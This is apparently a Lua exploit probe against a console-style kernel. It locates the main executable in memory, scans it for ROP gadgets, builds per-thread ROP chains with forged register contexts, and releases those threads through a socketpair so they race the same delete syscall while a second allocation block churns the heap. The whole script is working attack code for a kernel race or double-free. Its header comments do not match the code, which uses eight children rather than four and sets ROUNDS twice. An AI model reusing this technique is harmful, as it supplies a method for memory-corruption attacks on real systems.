-- CRASH_CLASS: HIGH
-- PROBE 765a: path-A race while a second block churns the malloc zone
--
-- 727a raced this with children spawned one after another: eight children a
-- hundred microseconds apart against a ten microsecond delete path, so every
-- round was one winner plus one follower that arrived after the slot was
-- cleared. 758a proved the replacement: children block in read() on the same
-- socket and one write wakes all of them, so they reach the delete within
-- microseconds of each other.
--
-- Each round: block create of 4 ids, four children blocked in read, one write
-- releases them, all four call 662 on the SAME id. The three other ids are then
-- deleted by the parent to retire the block, and one fresh create/poll/delete
-- cycle checks whether the allocator still behaves.
--
-- A child stores the syscall return in its own page, and the status array is the
-- third argument, so both are visible per child.

print("=== PROBE 765a: PATH A UNDER ZONE CONTENTION ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local fn = to_num(syscall.pipe.fn_addr)
local pid0 = call(syscall.pipe, 20,0,0,0,0,0,0)
print(string.format("[A] tid=%s fn=%08X", tostring(pid0), fn))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local ebase = nil
do
    local rb = mmap(0x8000)
    local cnt = to_num(memory.alloc(8)); wd(cnt, 0)
    call(mk(674), rb, 72, 512, cnt, 0x40000000, 0)
    local n = rd(cnt) or 0
    local best, bsz = nil, 0
    for i=0,math.min(n,512)-1 do
        local r = rb + i*72
        local a = rd(r) + rd(r+4)*4294967296
        local b = rd(r+8) + rd(r+12)*4294967296
        if rd(r+0x18) == 5 and (b-a) > 0x200000 and a < 0x1000000000 and (b-a) > bsz then best, bsz = a, b-a end
    end
    ebase = best
    print(string.format("[A] eboot=%s size=%X", tostring(ebase), bsz))
end
if not ebase then print("[A] no eboot") return end
local function find_pat(base, size, pat)
    local off, limit, chunk = 0, size - 0x20, 0x8000
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local st_rsi  = find_pat(ebase, 0x494000, string.char(0x48,0x89,0x06,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
print(string.format("[A] st_rsi=%s jmp=%s poprax=%s poprdi=%s poprsi=%s poprdx=%s",
    tostring(st_rsi), tostring(jmp_g), tostring(pop_rax), tostring(pop_rdi), tostring(pop_rsi), tostring(pop_rdx)))
if not (st_rsi and jmp_g and pop_rax and pop_rdi and pop_rsi and pop_rdx) then print("[A] gadgets missing") return end

local sv = to_num(memory.alloc(8)); wq(sv, uint64(0))
print("[A] socketpair="..tostring(call(mk(135), 1, 1, 0, sv, 0, 0)))
local s0, s1 = rd(sv), rd(sv+4)
print(string.format("[A] fd0=%s fd1=%s", tostring(s0), tostring(s1)))

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local ts = to_num(memory.alloc(16))
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local D = mmap(page)         -- block descriptor array data (raw copyin source)
zero(D, page)
local idcell = mmap(page)    -- out id
local ids = mmap(page)       -- id array for 662
local pay = mmap(page)       -- wake payload
local KIDS = 8          -- deleters
local COUNT = 1         -- block create size: 1 makes every delete take path A

local function spawn_delete(chain, stat_i, ret_i, ids_p)
    local ctx = to_num(memory.alloc(0x500))
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(chain))
    wq(ctx+Ctx.RDI, uint64(s0));      wq(ctx+Ctx.RSI, uint64(0))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(3))
    local tb = to_num(memory.alloc(8)); wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end

-- one chain per child, because each needs its own stat/ret pages
local chains = {}
local stats, rets = {}, {}
for i=0,KIDS-1 do
    local c = mmap(page)
    stats[i] = mmap(page); rets[i] = mmap(page)
    wq(c+0,  uint64(pop_rdi)); wq(c+8,  uint64(ids))
    wq(c+16, uint64(pop_rsi)); wq(c+24, uint64(1))
    wq(c+32, uint64(pop_rdx)); wq(c+40, uint64(stats[i]))
    wq(c+48, uint64(pop_rax)); wq(c+56, uint64(662))
    wq(c+64, uint64(fn))
    wq(c+72, uint64(pop_rsi)); wq(c+80, uint64(rets[i]))
    wq(c+88, uint64(st_rsi))
    wq(c+96, uint64(pop_rax)); wq(c+104, uint64(431))
    wq(c+112, uint64(fn));     wq(c+120, uint64(jmp_g))
    chains[i] = c
end

local ROUNDS = 10

local ROUNDS = 8
local EXTRA = 4          -- churn children deleting distinct ids of a second block
local tot_zero, tot_gone, tot_other = 0, 0, 0
local anomalies = 0
local ids2 = mmap(page)
local chains2, stats2, rets2 = {}, {}, {}
for i=0,EXTRA-1 do
    local c = mmap(page)
    stats2[i] = mmap(page); rets2[i] = mmap(page)
    wq(c+0,  uint64(pop_rdi)); wq(c+8,  uint64(ids2))
    wq(c+16, uint64(pop_rsi)); wq(c+24, uint64(1))
    wq(c+32, uint64(pop_rdx)); wq(c+40, uint64(stats2[i]))
    wq(c+48, uint64(pop_rax)); wq(c+56, uint64(662))
    wq(c+64, uint64(fn))
    wq(c+72, uint64(pop_rsi)); wq(c+80, uint64(rets2[i]))
    wq(c+88, uint64(st_rsi))
    wq(c+96, uint64(pop_rax)); wq(c+104, uint64(431))
    wq(c+112, uint64(fn));     wq(c+120, uint64(jmp_g))
    chains2[i] = c
end

local polls2 = mmap(page)
for r=1,ROUNDS do
    -- block 1: exactly one item -> path A (frees the 0x30 context)
    zero(D, page); wq(idcell, uint64(0))
    local cr = call(mk(669), 0x1001, D, 1, 1, idcell, 0)
    local base = rd(idcell) or 0
    -- block 2: eight items -> eight frees on the same malloc zone
    local cr2 = call(mk(669), 0x1001, D, 8, 1, idcell+4, 0)
    local base2 = rd(idcell+4) or 0
    if tostring(cr) ~= "0" or tostring(cr2) ~= "0" or base == 0 or base2 == 0 then
        print(string.format("A round %d create ret=%s/%s base=%X/%X", r, tostring(cr), tostring(cr2), base, base2))
        break
    end
    wd(ids, base)
    for i=0,7 do wd(ids2 + i*4, base2 + i*0x10000) end
    local p1 = mmap(page); local p2 = mmap(page)
    call(mk(664), ids, 1, p1, 0, 0, 0)
    call(mk(664), ids2, 8, p2, 0, 0, 0)
    local a1 = rd(p1) or 0
    local all2 = true
    for i=0,7 do local v = rd(p2+i*4) or 0; if v ~= 3 and v ~= 0x10003 then all2 = false end end
    -- children: 8 on the single-item id, 4 on distinct ids of block 2
    for i=0,7 do
        wd(stats[i], 0xCCCCCCCC); wq(rets[i], uint64(0xEEEEEEEEEEEEEEEE))
        spawn_delete(chains[i], i, i, ids)
    end
    for i=0,EXTRA-1 do
        wd(stats2[i], 0xCCCCCCCC); wq(rets2[i], uint64(0))
        spawn_delete(chains2[i], i, i, ids2 + (i+1)*4)
    end
    sleep_ms(40)
    for i=0,11 do wb(pay+i, 0x41+i) end
    local wr = call(mk(4), s1, pay, 12, 0, 0, 0)
    sleep_ms(50)
    local zeros, gone, other, gate = 0, 0, 0, 0
    for i=0,7 do
        local st = rd(stats[i]) or 0
        if st == 0 then zeros = zeros + 1
        elseif st == 0x80020003 then gone = gone + 1
        elseif st == 0x80020010 then gate = gate + 1
        else other = other + 1 end
    end
    local churn_ok, churn_bad = 0, 0
    for i=0,EXTRA-1 do
        local st = rd(stats2[i]) or 0
        if st == 0 then churn_ok = churn_ok + 1 else churn_bad = churn_bad + 1 end
    end
    tot_zero = tot_zero + zeros; tot_gone = tot_gone + gone; tot_other = tot_other + other
    -- retire what is left of block 2, then health
    local rstat = mmap(page)
    for i=5,7 do
        wd(ids, base2 + i*0x10000)
        call(mk(662), ids, 1, rstat, 0, 0, 0)
    end
    local hpoll, hdel = 0, 0
    zero(D, page); wq(idcell, uint64(0))
    local hcr = call(mk(669), 1, D, 1, 1, idcell, 0)
    local hid = rd(idcell) or 0
    if hid ~= 0 then
        wd(ids, hid)
        call(mk(664), ids, 1, rstat, 0, 0, 0)
        hpoll = rd(rstat) or 0
        call(mk(662), ids, 1, rstat, 0, 0, 0)
    end
    hdel = rd(rstat) or 0
    local bad = (zeros > 1) or (other > 0) or (gate > 0) or (hpoll ~= 3 and hpoll ~= 0x10003) or (hdel ~= 0)
    if bad then anomalies = anomalies + 1 end
    print(string.format("A r%02d p1=%08X all2=%s wr=%s zeros=%d gone=%d gate=%d other=%d churn=%d/%d health=%s/%s/%08X%s",
        r, a1, tostring(all2), tostring(wr), zeros, gone, gate, other, churn_ok, churn_bad,
        tostring(hcr), tostring(hpoll), hdel, bad and "  <-- ANOMALY" or ""))
end
print(string.format("[C] rounds=%d zero=%d gone=%d other=%d anomalies=%d", ROUNDS, tot_zero, tot_gone, tot_other, anomalies))
print("[D] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 765a DONE ===")
